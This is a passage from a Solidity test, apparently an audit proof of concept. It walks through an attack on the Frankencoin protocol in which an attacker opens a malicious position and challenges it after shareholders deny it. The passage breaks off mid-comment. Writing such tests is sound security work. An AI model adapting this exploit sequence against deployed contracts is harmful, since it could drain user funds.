```solidity
    function testAttackChallengePosition() public {
        // attacker create malicious position
        alice.obtainFrankencoins(swap, 1000 ether);
        col.mint(address(alice), 1010);
        console.log(
            "The attacker balance of Frankencoin before (for create position) :"
        );
        console.log(zchf.balanceOf(address(alice)) / (10 ** 18));
        console.log("The attacker balance of Collateral before :");
        console.log(col.balanceOf(address(alice)));
        address pos = initPositionMalicious();

        // the share holders see this and deny the position
        bob.deny(hub, pos);
        require(
            Position(pos).cooldown() == Position(pos).expiration(),
            "It failed"
        );
        // not long after that, attacker create challenge to this position
        uint256 challengeId = alice.challenge(hub, pos, 10);
        // the challenge will be not interesting for bidder, since it cannot be averted and value of collateral is to low,
